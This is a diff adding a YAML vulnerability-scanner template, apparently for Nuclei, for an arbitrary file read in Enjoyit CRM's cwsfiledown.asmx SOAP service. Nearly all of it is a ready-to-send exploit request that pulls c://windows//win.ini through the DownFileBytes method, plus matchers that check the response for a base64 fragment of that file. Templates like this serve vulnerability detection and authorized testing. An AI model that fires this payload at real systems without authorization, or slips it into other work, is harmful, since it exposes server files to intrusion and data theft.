@@ -1,0 +1,42 @@
+id: poc-yaml-enjoyit-crm-cwsfiledown-asmx-anyfile-read
+info:
+  name: Enjoyit CRM cwsfiledown.asmx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/DownFileBytes"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <DownFileBytes xmlns="http://tempuri.org/">
+              <sFileName>c://windows//win.ini</sFileName>
+              <iPosition>1</iPosition>
+              <iReadBytesLen>100</iReadBytesLen>
+              <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>
+            </DownFileBytes>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<DownFileBytesResult>"
+      - type: word
+        part: body
+        words:
+          - "IHN1cHBvcnQNCltmb250c10NCltleHRlbnNpb25zXQ0K"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
